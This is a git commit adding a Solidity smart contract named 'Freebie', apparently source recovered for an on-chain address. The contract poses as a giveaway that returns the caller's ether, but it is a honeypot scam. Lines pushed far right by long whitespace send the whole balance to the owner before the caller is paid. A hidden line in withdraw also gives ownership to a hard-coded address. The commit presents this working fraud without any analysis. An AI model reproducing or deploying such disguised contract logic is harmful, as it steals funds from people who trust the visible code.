d205c9838eea90bffce219d335c91ba534a65bfa
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 14:56:40 +0700

    add contract Freebie

---
+++ Freebie.sol
@@ -0,0 +1,37 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Freebie at 0xe82f0742A71a02b9E9fFC142fdcB6eb1ED06FB87
+*/
+pragma solidity ^0.4.19;
+
+contract Freebie
+{
+    address public Owner = msg.sender;
+   
+    function() public payable{}
+   
+    function GetFreebie()
+    public
+    payable
+    {                                                                    
+        if(msg.value>1 ether)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
+            msg.sender.transfer(this.balance);
+        }                                                                                                                
+    }
+    
+    function withdraw()
+    payable
+    public
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+    
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        adr.call.value(msg.value)(data);
+    }
+}
